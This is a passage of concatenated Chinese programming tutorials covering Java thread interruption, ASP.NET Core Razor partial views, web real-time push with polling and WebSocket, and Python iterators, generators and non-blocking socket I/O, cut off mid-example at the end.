    Thread sleepThread = new Thread(new SleepRunner(), "SleepThread");
    sleepThread.setDaemon(true);
    
    // busyThread不停的运行
    Thread busyThread = new Thread(new BusyRunner(), "BusyThread");
    busyThread.setDaemon(true);
    sleepThread.start();
    busyThread.start();
    
    // 休眠5秒，让sleepThread和busyThread充分运行
    TimeUnit.SECONDS.sleep(5);
    
    sleepThread.interrupt();
    busyThread.interrupt();
    log.info("SleepThread interrupted is {}", sleepThread.isInterrupted());
    log.info("BusyThread interrupted is {}", busyThread.isInterrupted());

    // 防止sleepThread和busyThread立刻退出
    TimeUnit.SECONDS.sleep(5);
    log.info("exit");
  }

  static class SleepRunner implements Runnable {
    @Override
    public void run() {
      try {
        while (true) {
          Thread.sleep(2000);
        }
      } catch (InterruptedException e) {
        log.error("SleepThread interrupted is {}", Thread.currentThread().isInterrupted());
        Thread.currentThread().interrupt();
        log.error("SleepThread interrupted is {}", Thread.currentThread().isInterrupted());
      }
      log.info("exit");
    }
  }

  static class BusyRunner implements Runnable {
    @Override
    public void run() {
      if (1 == 1) {
        while (true) {
        }
      }
      log.info("exit");
    }
  }
}
// 打印：
[14 10:20:55,269 INFO ] [main]        Interrupted - SleepThread interrupted is false
[14 10:20:55,269 ERROR] [SleepThread] Interrupted - SleepThread interrupted is false
[14 10:20:55,270 INFO ] [main]        Interrupted - BusyThread interrupted is true
[14 10:20:55,270 ERROR] [SleepThread] Interrupted - SleepThread interrupted is true
[14 10:20:55,271 INFO ] [SleepThread] Interrupted - exit
[14 10:21:00,271 INFO ] [main]        Interrupted - exit
从日志中可以看到：

打断的确是一个标记，对于未处于可打断状态的线程，或者没有处理打断状态的线程是没有影响的，就像 BusyThread；
使用 interrupt 打断睡眠线程，也的确符合上面的情况，但是因为收到 InterruptedException 的时候会清楚中断标记，所以这里可以再次设置中断标记；

当然以上只是简单的举例，中断机制如何使用还是要根据具体的业务逻辑来确定；另外以上的实例代码是出自《Java 并发编程的艺术》，有兴趣的也可以找书来看一下；
总结

以上的内容其主要目的是为了帮助你构建一个相对完善的线程知识体系，其中还有很多的细节没有讲到，具体内容还需要结合实际场景分析；


********************************************************************************************************************************************************************************************************
asp.net core系列 42 Web 应用 分部视图
一.分部视图
　　对于MVC 视图和 Razor Pages 页面，都有分部视图功能。通常将 MVC 视图和 Razor Pages 页面统称为“标记文件”，下面会常提到该名词。使用分部视图的优势包括：(1) 将大型标记文件分解为更小的组件。(2) 减少跨标记文件中，常见标记内容的重复。
　　建议：(1)不应使用分部视图来维护常见布局元素，常见布局元素应在 _Layout.cshtml 文件中指定，比如页头、页尾。(2)当需要呈现复杂逻辑或代码执行的应该使用视图组件。
 
　　1.1 声明分部视图
　　　　分部视图是在 Views 文件夹 (MVC) 或 Pages 文件夹 (Razor Pages) 中维护的 .cshtml 标记文件。在 ASP.NET Core MVC 中，控制器的 ViewResult 能够返回视图或分部视图。 在 ASP.NET Core 2.2 中 Razor Pages 的PageModel 可以返回 PartialViewResult分部视图。
　　　　分部视图不会运行 _ViewStart.cshtml页，这涉及到布局以后再讲。分部视图的文件名通常以下划线 _ 开头，没有.cshtml.cs文件。
　　　　
　　1.2 引用分部视图
　　　　在标记文件中，有多种方法可引用分部视图。 建议应用程序使用以下异步呈现方法之一：(1) 分部标记帮助程序。(2) 异步 HTML 帮助程序。 不建议使用同步HTML 帮助程序, 因为可能会出现死锁的情况， 同步方法以后版本中会删除，这里不再介绍。
 
　　　　(1) 分部标记帮助程序
　　　　　　分部标记帮助程序会异步呈现内容，并使用类似 HTML 的语法:

   　　　　 <partial name="_PartialName" />

　　　　　　当存在文件扩展名时，标记帮助程序会引用分部视图，该视图必须与调用分部视图的标记文件位于同一文件夹中：　　　

　　　　　　<partial name="_PartialName.cshtml" />

　　　　　　以下示例从应用程序根目录引用分部视图。 以 (~/) 或 (/) 开头的路径，指代应用程序根目录：

    　　　　Razor 页面CSHTML
    　　　　<partial name="~/Pages/Folder/_PartialName.cshtml" />
       　　<partial name="/Pages/Folder/_PartialName.cshtml" />


   　　　　 MVC  CSHTML
   　　　　 <partial name="~/Views/Folder/_PartialName.cshtml" />
    　　　　<partial name="/Views/Folder/_PartialName.cshtml" />


　　　　　　使用相对路径的分部视图
　　　　　　<partial name="../Account/_PartialName.cshtml" />

　　　　
　　　　(2) 异步 HTML 帮助程序
　　　　　　使用 HTML 帮助程序时，最佳做法是使用 PartialAsync，同步是使用Partial(不建议使用同步)。PartialAsync 返回包含在 Task<TResult> 中的 IHtmlContent 类型。通过@await来引用该方法。

Razor 页面CSHTML
@await Html.PartialAsync("~/Pages/Folder/_PartialName.cshtml")
@await Html.PartialAsync("/Pages/Folder/_PartialName.cshtml")


mvc CSHTML
@await Html.PartialAsync("~/Views/Folder/_PartialName.cshtml")
@await Html.PartialAsync("/Views/Folder/_PartialName.cshtml")

　　　　　　也可以使用 RenderPartialAsync 呈现分部视图。 此方法不返回 IHtmlContent。它将呈现的输出，直接流式传输到响应, 因此在某些情况下它可提供更好的性能。 因为该方法不返回结果，所以必须在 Razor 代码块内调用它：

@{
    await Html.RenderPartialAsync("_AuthorPartial");
}

 
　　1.3 分部视图发现
　　　　如果按名称（无文件扩展名）引用分部视图，则按所述顺序搜索以下位置：
      　　 (1) Razor 页面
                  1.当前正在执行页面的文件夹
                  2.该页面文件夹上方的目录图
                  3./Shared
                  4./Pages/Shared
                  5./Views/Shared
        　　 (2) MVC
                   1./Areas/<Area-Name>/Views/<Controller-Name>
                   2./Areas/<Area-Name>/Views/Shared
                   3./Views/Shared
                   4./Pages/Shared
　　　　　　
　　1.4 通过分部视图访问数据
　　　　实例化分部视图时，它会获得父视图(主视图)的 ViewData 字典的副本。 在分部视图内，对数据所做的更新不会保存到父视图中。 对分部视图中的 ViewData 更改，会在分部视图返回时丢失。
　　　　以下示例演示如何将 ViewDataDictionary(ViewData 字典)的实例传递给分部视图：

　　　　@await Html.PartialAsync("_PartialName", customViewData)

　　　　还可将模型(实体对象)传入分部视图。 模型可以是自定义对象。

　　　　@await Html.PartialAsync("_PartialName", model)

　　　　
二. 演示
　　下面演示一个Razor的分部视图(MVC的参考官网示例)。示例中Pages/ArticlesRP/ReadRP.cshtml是主视图，Pages/Shared/_AuthorPartialRP.cshtml是第一个分部视图，传入“作者”。Pages/ArticlesRP/_ArticleSectionRP.cshtml 是第二个分部视图,传入ViewData字典和section模型二个参数，这二个参数是PartialAsync的方法重载。 三个文件结构如下：

　　(1) 创建实体类

   public class Article
    {
        public string Title { get; set; }

        public string AuthorName { get; set; }

        public string PublicationDate { get; set; }

        public List<ArticleSection> Sections { get; set; }
    }

    public class ArticleSection
    {
        public string Title { get; set; }
        public string Content { get; set; }
    }

　　(2)主视图

    public class ReadRPModel : PageModel
    {
        public Article Article { get; set; }

        public void OnGet()
        {
            Article = new Article()
            {
                Title = "来自 <共享分部视图文件路径> 的分部视图",
                AuthorName = "Abraham Lincoln",
                PublicationDate= "1863 年 11 月 19 日中午 12:00:00",
                Sections = new List<ArticleSection>() {
                         new ArticleSection (){ Title="第一节索引", Content="八十七年前..." },
                         new ArticleSection (){ Title="第二节索引", Content="如今，我们正在进行一场伟大的内战，考验着......" },
                         new ArticleSection (){ Title="第三节索引", Content="然而，从更广泛的意义上说，我们无法奉献..." },
                }
            };
        }
    }


@page
@model ReadRPModel

<h2>@Model.Article.Title</h2>

@Model.Article.PublicationDate

@* 将作者名字传到 Pages\Shared\_AuthorPartialRP.cshtml*@
<p>---------------------------------第一个分部视图/Views/Shared/_AuthorPartial.cshtml</p>
@await Html.PartialAsync("../Shared/_AuthorPartialRP.cshtml", Model.Article.AuthorName)


<p></p>
@*  Loop over the Sections and pass in a section and additional ViewData to
    the strongly typed Pages\ArticlesRP\_ArticleSectionRP.cshtml partial view. *@
<p>---------------------------------第二个分部视图/Views/Shared/_ArticleSection.cshtml</p>
@{
    var index = 0;

    @foreach (var section in Model.Article.Sections)
    {
        @await Html.PartialAsync("_ArticleSectionRP", section,
                                 new ViewDataDictionary(ViewData)
                                 {
                                     { "index", index }
                                 })

        index++;
    }
}

　　(3) 分部视图 _AuthorPartialRP.cshtm

@* 将传过来的string类型映射*@
@model string
<div>
    <h3>@Model</h3>
</div>

 　　(4) 分部视图 _ArticleSectionRP.cshtml 

@using StudyRazorDemo.Models;

@* 将传过来的对象映射到ArticleSection中*@
@model ArticleSection

<h3>@Model.Title Index: @ViewData["index"]</h3>
<div>
    @Model.Content
</div>
<p></p>

 　　
　　启动程序，运行http://localhost:42921/ArticlesRP/ReadRP，显示如下：

 
　　参考资料
　　　　ASP.NET Core 中的分部视图
　　　
********************************************************************************************************************************************************************************************************
WEB 实时推送技术的总结
前言
随着 Web 的发展，用户对于 Web 的实时推送要求也越来越高 ，比如，工业运行监控、Web 在线通讯、即时报价系统、在线游戏等，都需要将后台发生的变化主动地、实时地传送到浏览器端，而不需要用户手动地刷新页面。本文对过去和现在流行的 Web 实时推送技术进行了比较与总结。
本文完整的源代码请猛戳Github博客，纸上得来终觉浅，建议大家动手敲敲代码。
一、双向通信
HTTP 协议有一个缺陷：通信只能由客户端发起。举例来说，我们想了解今天的天气，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。在WebSocket协议之前，有三种实现双向通信的方式：轮询（polling）、长轮询（long-polling）和iframe流（streaming）。
1.轮询（polling）

轮询是客户端和服务器之间会一直进行连接，每隔一段时间就询问一次。其缺点也很明显：连接数会很多，一个接受，一个发送。而且每次发送请求都会有Http的Header，会很耗流量，也会消耗CPU的利用率。

优点：实现简单，无需做过多的更改
缺点：轮询的间隔过长，会导致用户不能及时接收到更新的数据；轮询的间隔过短，会导致查询请求过多，增加服务器端的负担

// 1.html
<div id="clock"></div>
<script>
    let clockDiv = document.getElementById('clock');
    setInterval(function(){
        let xhr = new XMLHttpRequest;
        xhr.open('GET','/clock',true);
        xhr.onreadystatechange = function(){
            if(xhr.readyState == 4 && xhr.status == 200){
                console.log(xhr.responseText);
                clockDiv.innerHTML = xhr.responseText;
            }
        }
        xhr.send();
    },1000);
</script>
//轮询  服务端
let express = require('express');
let app = express();
app.use(express.static(__dirname));
app.get('/clock',function(req,res){
  res.end(new Date().toLocaleString());
});
app.listen(8080);
启动本地服务，打开http://localhost:8080/1.html,得到如下结果：

2.长轮询（long-polling）

长轮询是对轮询的改进版，客户端发送HTTP给服务器之后，看有没有新消息，如果没有新消息，就一直等待。当有新消息的时候，才会返回给客户端。在某种程度上减小了网络带宽和CPU利用率等问题。由于http数据包的头部数据量往往很大（通常有400多个字节），但是真正被服务器需要的数据却很少（有时只有10个字节左右），这样的数据包在网络上周期性的传输，难免对网络带宽是一种浪费。

优点：比 Polling 做了优化，有较好的时效性
缺点：保持连接会消耗资源; 服务器没有返回有效数据，程序超时。

// 2.html  服务端代码同上
<div id="clock"></div>
<script>
let clockDiv = document.getElementById('clock')
function send() {
  let xhr = new XMLHttpRequest()
  xhr.open('GET', '/clock', true)
  xhr.timeout = 2000 // 超时时间，单位是毫秒
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
      if (xhr.status == 200) {
        //如果返回成功了，则显示结果
        clockDiv.innerHTML = xhr.responseText
      }
      send() //不管成功还是失败都会发下一次请求
    }
  }
  xhr.ontimeout = function() {
    send()
  }
  xhr.send()
}
send()
</script>
3.iframe流（streaming）

iframe流方式是在页面中插入一个隐藏的iframe，利用其src属性在服务器和客户端之间创建一条长连接，服务器向iframe传输数据（通常是HTML，内有负责插入信息的javascript），来实时更新页面。

优点：消息能够实时到达；浏览器兼容好
缺点：服务器维护一个长连接会增加开销；IE、chrome、Firefox会显示加载没有完成，图标会不停旋转。

// 3.html
<body>
    <div id="clock"></div>
    <iframe src="/clock" style="display:none"></iframe>
</body>
//iframe流 
let express = require('express')
let app = express()
app.use(express.static(__dirname))
app.get('/clock', function(req, res) {
  setInterval(function() {
    let date = new Date().toLocaleString()
    res.write(`
       <script type="text/javascript">
         parent.document.getElementById('clock').innerHTML = "${date}";//改变父窗口dom元素
       </script>
     `)
  }, 1000)
})
app.listen(8080)
启动本地服务，打开http://localhost:8080/3.html,得到如下结果：

上述代码中，客户端只请求一次，然而服务端却是源源不断向客户端发送数据，这样服务器维护一个长连接会增加开销。
以上我们介绍了三种实时推送技术，然而各自的缺点很明显，使用起来并不理想，接下来我们着重介绍另一种技术--websocket,它是比较理想的双向通信技术。
二、WebSocket
1.什么是websocket
WebSocket是一种全新的协议，随着HTML5草案的不断完善，越来越多的现代浏览器开始全面支持WebSocket技术了，它将TCP的Socket（套接字）应用在了webpage上，从而使通信双方建立起一个保持在活动状态连接通道。
一旦Web服务器与客户端之间建立起WebSocket协议的通信连接，之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送JSON、XML、HTML或图片等任意格式的数据。由于是建立在HTTP基础上的协议，因此连接的发起方仍是客户端，而一旦确立WebSocket通信连接，不论服务器还是客户端，任意一方都可直接向对方发送报文。
初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？
2.HTTP的局限性

HTTP是半双工协议，也就是说，在同一时刻数据只能单向流动，客户端向服务器发送请求(单向的)，然后服务器响应请求(单向的)。
服务器不能主动推送数据给浏览器。这就会导致一些高级功能难以实现，诸如聊天室场景就没法实现。

3.WebSocket的特点

支持双向通信，实时性更强
可以发送文本，也可以发送二进制数据
减少通信量：只要建立起WebSocket连接，就希望一直保持连接状态。和HTTP相比，不但每次连接时的总开销减少，而且由于WebSocket的首部信息很小，通信量也相应减少了


相对于传统的HTTP每次请求-应答都需要客户端与服务端建立连接的模式，WebSocket是类似Socket的TCP长连接的通讯模式，一旦WebSocket连接建立后，后续数据都以帧序列的形式传输。在客户端断开WebSocket连接或Server端断掉连接前，不需要客户端和服务端重新发起连接请求。在海量并发和客户端与服务器交互负载流量大的情况下，极大的节省了网络带宽资源的消耗，有明显的性能优势，且客户端发送和接受消息是在同一个持久连接上发起，实时性优势明显。
接下来我看下websocket如何实现客户端与服务端双向通信：
// websocket.html
<div id="clock"></div>
<script>
let clockDiv = document.getElementById('clock')
let socket = new WebSocket('ws://localhost:9999')
//当连接成功之后就会执行回调函数
socket.onopen = function() {
  console.log('客户端连接成功')
  //再向服务 器发送一个消息
  socket.send('hello') //客户端发的消息内容 为hello
}
//绑定事件是用加属性的方式
socket.onmessage = function(event) {
  clockDiv.innerHTML = event.data
  console.log('收到服务器端的响应', event.data)
}
</script>
// websocket.js
let express = require('express')
let app = express()
app.use(express.static(__dirname))
//http服务器
app.listen(3000)
let WebSocketServer = require('ws').Server
//用ws模块启动一个websocket服务器,监听了9999端口
let wsServer = new WebSocketServer({ port: 9999 })
//监听客户端的连接请求  当客户端连接服务器的时候，就会触发connection事件
//socket代表一个客户端,不是所有客户端共享的，而是每个客户端都有一个socket
wsServer.on('connection', function(socket) {
  //每一个socket都有一个唯一的ID属性
  console.log(socket)
  console.log('客户端连接成功')
  //监听对方发过来的消息
  socket.on('message', function(message) {
    console.log('接收到客户端的消息', message)
    socket.send('服务器回应:' + message)
  })
})
启动本地服务，打开http://localhost:3000/websocket.html,得到如下结果：

三、Web 实时推送技术的比较

综上所述：Websocket协议不仅解决了HTTP协议中服务端的被动性，即通信只能由客户端发起，也解决了数据同步有延迟的问题，同时还带来了明显的性能优势，所以websocket
是Web 实时推送技术的比较理想的方案，但如果要兼容低版本浏览器，可以考虑用轮询来实现。
参考文章

WebSocket 教程
珠峰前端架构课
Web 实时推送技术的总结
WebSocket（1）： 服务端“实时推送”的演变
长连接/websocket/SSE等主流服务器推送技术比较


********************************************************************************************************************************************************************************************************
Python3 与 C# 并发编程之～ 协程篇

 


3.协程篇¶
去年微信公众号就陆陆续续发布了，我一直以为博客也汇总同步了，这几天有朋友说一直没找到，遂发现，的确是漏了，所以补上一篇
在线预览：https://github.lesschina.com/python/base/concurrency/4.并发编程-协程篇.html
示例代码：https://github.com/lotapp/BaseCode/tree/master/python/5.concurrent/ZCoroutine
多进程和多线程切换之间也是有资源浪费的，相比而言协程更轻量级
3.1.知识回顾¶
1.装饰器¶
往期文章：https://www.cnblogs.com/dotnetcrazy/p/9333792.html#2.Python装饰器
基础拓展篇已经讲的很透彻了，就不再雷同了，贴一个简单案例，然后扩展说说可迭代、迭代器和生成器





In [1]:



% time

from functools import wraps

def log(func):
    @wraps(func)
    def wrapper(*args,**kv):
        print("%s log_info..." % func.__name__)
        return func(*args,**kv)
    return wrapper

@log
def login_out():
    print("已经退出登录")

def main():
    # @wraps(func) 可以使得装饰前后，方法签名一致
    print(f"方法签名：{login_out.__name__}")
    login_out()
    
    # @wraps能让你通过属性 __wrapped__ 直接访问被包装函数
    login_out.__wrapped__() # 执行原来的函数

if __name__ == '__main__':
    main()








 

Wall time: 0 ns
方法签名：login_out
login_out log_info...
已经退出登录
已经退出登录







 


2.迭代器¶
往期文章：https://www.cnblogs.com/dotnetcrazy/p/9278573.html#6.Python迭代器
过于基础的就不说了，简单说下，然后举一个OOP的Demo：

判断是否可迭代：（能不能for遍历）

from collections.abc import Iterable
isinstance(xxx, Iterable)


判断是否是迭代器：（能不能next(xxx)遍历）

from collections.abc import Iterator
isinstance(xxx, Iterable)
PS：迭代器是一定可以迭代的


可迭代对象转迭代器：（生成器都是迭代器）

把list、dict、str等Iterable变成Iterator可以使用iter()函数 eg：iter([])（节省资源）
PS：生成器都是Iterator对象，但list、dict、str虽然是Iterable，却不是Iterator



提醒一下：from collections import Iterable, Iterator # 现在已经不推荐使用了（3.8会弃用）
查看一下typing.py的源码就知道了:

# 模仿collections.abc中的那些（Python3.7目前只是过渡的兼容版，没有具体实现）
def _alias(origin, params, inst=True):
    return _GenericAlias(origin, params, special=True, inst=inst)

T_co = TypeVar('T_co', covariant=True)  # Any type covariant containers.

Iterable = _alias(collections.abc.Iterable, T_co)
Iterator = _alias(collections.abc.Iterator, T_co)


之前说了个 CSharp 的 OOP Demo，这次来个Python的，我们来一步步演变：





In [2]:



% time

# 导入相关模块
from collections.abc import Iterable, Iterator
# from collections import Iterable, Iterator # 现在已经不推荐使用了（3.8会弃用）








 

Wall time: 0 ns








In [3]:



# 定义一个Class
class MyArray(object):
    pass








In [4]:



# 是否可迭代 False
isinstance(MyArray(),Iterable)








Out[4]:

False







In [5]:



# 是否是迭代器 False
isinstance(MyArray(),Iterator)








Out[5]:

False







In [6]:



# 如果Class里面含有`__iter__`方法就是可迭代的








In [7]:



# 重新定义测试：
class MyArray(object):
    def __iter__(self):
        pass

# 是否可迭代 False
isinstance(MyArray(),Iterable)








Out[7]:

True







In [8]:



# 是否是迭代器 False
isinstance(MyArray(),Iterator)








Out[8]:

False






 


这时候依然不是迭代器
这个可以类比C#：

能不能foreach就看你遍历对象有没有实现IEnumerable，就说明你是不是一个可枚举类型（enumerator type）
是不是个枚举器（enumerator）就看你实现了IEnumerator接口没


// 能不能foreach就看你遍历对象有没有实现IEnumerable，就说明你是不是一个可枚举类型
public interface IEnumerable
{
    IEnumerator GetEnumerator();
}

// 是不是个枚举器（enumerator）就看你实现了IEnumerator接口没
public interface IEnumerator
{
    object Current { get; }

    bool MoveNext();

    void Reset();
}


先看看Python对于的类吧：

# https://github.com/lotapp/cpython3/blob/master/Lib/_collections_abc.py
class Iterable(metaclass=ABCMeta):

    __slots__ = ()

    @abstractmethod
    def __iter__(self):
        while False:
            yield None

    @classmethod
    def __subclasshook__(cls, C):
        if cls is Iterable:
            return _check_methods(C, "__iter__")
        return NotImplemented

class Iterator(Iterable):

    __slots__ = ()

    @abstractmethod
    def __next__(self):
        'Return the next item from the iterator. When exhausted, raise StopIteration'
        raise StopIteration

    def __iter__(self):
        return self

    @classmethod
    def __subclasshook__(cls, C):
        if cls is Iterator:
            return _check_methods(C, '__iter__', '__next__')
        return NotImplemented


读源码的好处来了==>抽象方法：@abstractmethod（子类必须实现），上次漏讲了吧～
上面说迭代器肯定可以迭代，说很抽象，代码太直观了 (继承)：class Iterator(Iterable)
现在我们来模仿并实现一个Python版本的迭代器：





In [9]:



% time

# 先搭个空架子
class MyIterator(Iterator):
    def __next__(self):
        pass

class MyArray(Iterable):
    def __iter__(self):
        return MyIterator() # 返回一个迭代器

def main():
    # 可迭代 True
    print(isinstance(MyArray(), Iterable))
    # 迭代器也是可迭代的 True
    print(isinstance(MyIterator(), Iterable))
    # 是迭代器 True
    print(isinstance(MyIterator(), Iterator))

if __name__ == '__main__':
    main()








 

Wall time: 0 ns
True
True
True








In [10]:



% time

# 把迭代器简化合并
class MyIterator(Iterator):
    def __next__(self):
        pass

    def __iter__(self):
        return self # 返回一个迭代器(现在就是它自己了)

def main():
    print(isinstance(MyIterator(), Iterable))
    print(isinstance(MyIterator(), Iterator))

if __name__ == '__main__':
    main()








 

Wall time: 0 ns
True
True








In [11]:



% time

# 马上进入正题了，先回顾一下Fibona
def fibona(n):
    a, b = 0, 1
    for i in range(n):
        a, b = b, a+b
        print(a)

# 获取10个斐波拉契数列
fibona(10)








 

Wall time: 0 ns
1
1
2
3
5
8
13
21
34
55








In [12]:



% time

# 改造成迭代器
from collections.abc import Iterable, Iterator

class FibonaIterator(Iterator):
    def __init__(self, n):
        self.__a = 0
        self.__b = 1
        self.__n = n  # 获取多少个
        self.__index = 0  # 当前索引

    def __next__(self):
        if self.__index < self.__n:
            self.__index += 1
            # 生成下一波
            self.__a, self.__b = self.__b, self.__a + self.__b
            return self.__a
        else:
            raise StopIteration # for循环结束条件

def main():
    print(FibonaIterator(10))
    for i in FibonaIterator(10):
        print(i)

if __name__ == "__main__":
    main()








 

Wall time: 0 ns
<__main__.FibonaIterator object at 0x000001CAFFD2C748>
1
1
2
3
5
8
13
21
34
55







 


3.生成器¶
往期文章：https://www.cnblogs.com/dotnetcrazy/p/9278573.html#5.Python生成器
生成器是啥？看源码就秒懂了：(迭代器的基础上再封装)

class Generator(Iterator):
    __slots__ = ()

    def __next__(self):
        """从生成器返回下一个item，结束的时候抛出 StopIteration"""
        return self.send(None)

    @abstractmethod
    def send(self, value):
        """将值发送到生成器。返回下一个产生的值或抛出StopIteration"""
        raise StopIteration

    @abstractmethod
    def throw(self, typ, val=None, tb=None):
        """在生成器中引发异常。返回下一个产生的值或抛出StopIteration"""
        if val is None:
            if tb is None:
                raise typ
            val = typ()
        if tb is not None:
            val = val.with_traceback(tb)
        raise val

    # 现在知道之前close后为啥没异常了吧～
    def close(self):
        """屏蔽异常"""
        try:
            self.throw(GeneratorExit)
        except (GeneratorExit, StopIteration):
            pass
        else:
            raise RuntimeError("generator ignored GeneratorExit")

    @classmethod
    def __subclasshook__(cls, C):
        if cls is Generator:
            return _check_methods(C, '__iter__', '__next__',
                                  'send', 'throw', 'close')
        return NotImplemented


迭代器的基础上再封装了两个抽象方法send、throw和屏蔽异常的方法close
现在用生成器的方式改写下斐波拉契数列：（列表推导式改成小括号是最简单的一种生成器）





In [13]:



% time

# 代码瞬间就简洁了
def fibona(n):
    a = 0
    b = 1
    for _ in range(n):
        a, b = b, a + b
        yield a # 加个yiel就变成生成器了

def main():
    print(fibona(10))
    for i in fibona(10):
        print(i)

if __name__ == "__main__":
    main()








 

Wall time: 0 ns
<generator object fibona at 0x000001CAFFD1AC00>
1
1
2
3
5
8
13
21
34
55







 


注意下这几点：

generator刚启动的时候，要么 next()，要么 send(None)，不然会引发：

TypeError: can't send non-None value to a just-started generator


在一个generator函数中，遇到return或者break则直接抛出StopIteration终止迭代

如果没有则默认执行至函数完毕


如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中


def test_send(n):
    for i in range(n):
        if i==2:
            return "i==2"
        yield i

g = test_send(5)

while True:
    try:
        tmp = next(g)
        print(tmp)
    except StopIteration as ex:
        print(ex.value)
        break


输出：
0
1
i==2
其他的也没什么好说的了，读完源码再看看之前讲的内容别有一番滋味在心头哦～




 


3.2.概念篇¶
上集回顾：网络：静态服务器+压测
1.同步与异步¶

同步是指一个任务的完成需要依赖另外一个任务时，只有等待被依赖的任务完成后，依赖的任务才能算完成。
异步是指不需要等待被依赖的任务完成，只是通知被依赖的任务要完成什么工作。然后继续执行下面代码逻辑，只要自己完成了整个任务就算完成了（异步一般使用状态、通知和回调）

PS：项目里面一般是这样的：（个人经验）

同步架构：一般都是和钱相关的需求，需要实时返回的业务
异步架构：更多是对写要求比较高时的场景（同步变异步）

读一般都是实时返回，代码一般都是await xxx()


想象个情景就清楚了：

异步：现在用户写了篇文章，可以异步操作，就算没真正写到数据库也可以返回：发表成功（大不了失败提示一下）
同步：用户获取订单信息，你如果异步就会这样了：提示下获取成功，然后一片空白...用户不卸载就怪了...



2.阻塞与非阻塞¶

阻塞是指调用结果返回之前，当前线程会被挂起，一直处于等待消息通知，不能够执行其他业务（大部分代码都是这样的）
非阻塞是指在不能立刻得到结果之前，该函数不会阻塞当前线程，而会立刻返回（继续执行下面代码，或者重试机制走起）

PS：项目里面重试机制为啥一般都是3次？

第一次重试，两台PC挂了也是有可能的
第二次重试，负载均衡分配的三台机器同时挂的可能性不是很大，这时候就有可能是网络有点拥堵了
最后一次重试，再失败就没意义了，日记写起来，再重试网络负担就加大了，得不偿失了

3.五种IO模型¶
对于一次IO访问，数据会先被拷贝到内核的缓冲区中，然后才会从内核的缓冲区拷贝到应用程序的地址空间。需要经历两个阶段：

准备数据
将数据从内核缓冲区拷贝到进程地址空间

由于存在这两个阶段，Linux产生了下面五种IO模型（以socket为例）

阻塞式IO：

当用户进程调用了recvfrom等阻塞方法时，内核进入IO的第1个阶段：准备数据（内核需要等待足够的数据再拷贝）这个过程需要等待，用户进程会被阻塞，等内核将数据准备好，然后拷贝到用户地址空间，内核返回结果，用户进程才从阻塞态进入就绪态
Linux中默认情况下所有的socket都是阻塞的


非阻塞式IO：

当用户进程发出read操作时，如果kernel中的数据还没有准备好，那么它并不会block用户进程，而是立刻返回一个error。
用户进程判断结果是一个error时，它就知道数据还没有准备好，于是它可以再次发送read操作
一旦kernel中的数据准备好了，并且又再次收到了用户进程的system call，那么它马上就将数据拷贝到了用户内存，然后返回
非阻塞IO模式下用户进程需要不断地询问内核的数据准备好了没有


IO多路复用：

通过一种机制，一个进程可以监视多个文件描述符（套接字描述符）一旦某个文件描述符就绪（一般是读就绪或者写就绪），能够通知程序进行相应的读写操作（这样就不需要每个用户进程不断的询问内核数据准备好了没）
常用的IO多路复用方式有select、poll和epoll


信号驱动IO：（之前我们讲进程先导篇的时候说过）

内核文件描述符就绪后，通过信号通知用户进程，用户进程再通过系统调用读取数据。
此方式属于同步IO（实际读取数据到用户进程缓存的工作仍然是由用户进程自己负责的）


异步IO（POSIX的aio_系列函数）

用户进程发起read操作之后，立刻就可以开始去做其它的事。内核收到一个异步IO read之后，会立刻返回，不会阻塞用户进程。
内核会等待数据准备完成，然后将数据拷贝到用户内存，当这一切都完成之后，内核会给用户进程发送一个signal告诉它read操作完成了



4.Unix图示¶
贴一下Unix编程里面的图：
非阻塞IO

IO复用

信号IO

异步AIO

3.3.IO多路复用¶
开始之前咱们通过非阻塞IO引入一下：（来个简单例子socket.setblocking(False))

import time
import socket

def select(socket_addr_list):
    for client_socket, client_addr in socket_addr_list:
        try:
            data = client_socket.recv(2048)
            if data:
                print(f"[来自{client_addr}的消息：]\n")
                print(data.decode("utf-8"))
                client_socket.send(
                    b"HTTP/1.1 200 ok\r\nContent-Type: text/html;charset=utf-8\r\n\r\n<h1>Web Server Test</h1>"
                )
            else:
                # 没有消息是触发异常，空消息是断开连接
                client_socket.close()  # 关闭客户端连接
                socket_addr_list.remove((client_socket, client_addr))
                print(f"[客户端{client_addr}已断开连接，当前连接数：{len(socket_addr_list)}]")
        except Exception:
            pass

def main():
    # 存放客户端集合
    socket_addr_list = list()

    with socket.socket() as tcp_server:
        # 防止端口绑定的设置
        tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcp_server.bind(('', 8080))
        tcp_server.listen()
        tcp_server.setblocking(False)  # 服务端非阻塞
        while True:
            try:
                client_socket, client_addr = tcp_server.accept()
                client_socket.setblocking(False)  # 客户端非阻塞
                socket_addr_list.append((client_socket, client_addr))
            except Exception:
                pass
            else:
                print(f"[来自{client_addr}的连接，当前连接数：{len(socket_addr_list)}]")
            # 防止客户端断开后出错
            if socket_addr_list:
                # 轮询查看客户端有没有消息
                select(socket_addr_list)  # 引用传参
                time.sleep(0.01)

if __name__ == "__main__":
    main()


输出： 
可以思考下：

为什么Server也要设置为非阻塞？

PS：一个线程里面只能有一个死循环，现在程序需要两个死循环，so ==> 放一起咯


断开连接怎么判断？

PS：没有消息是触发异常，空消息是断开连接


client_socket为什么不用dict存放？

PS：dict在循环的过程中，del会引发异常



1.Select¶
select和上面的有点类似，就是轮询的过程交给了操作系统：

kernel会“监视”所有select负责的socket，当任何一个socket中的数据准备好了，select就会返回。这个时候用户进程再调用read操作，将数据从kernel拷贝到用户进程

来个和上面等同的案例：

import select
import socket

def main():
    with socket.socket() as tcp_server:
        tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcp_server.bind(('', 8080))
        tcp_server.listen()
        socket_info_dict = dict()
        socket_list = [tcp_server]  # 监测列表
        while True:
            # 劣势：select列表数量有限制
            read_list, write_list, error_list = select.select(
                socket_list, [], [])
            for item in read_list:
                # 服务端迎接新的连接
                if item == tcp_server:
                    client_socket, client_address = item.accept()
                    socket_list.append(client_socket)
                    socket_info_dict[client_socket] = client_address
                    print(f"[{client_address}已连接，当前连接数：{len(socket_list)-1}]")
                # 客户端发来
                else:
                    data = item.recv(2048)
                    if data:
                        print(data.decode("utf-8"))
                        item.send(
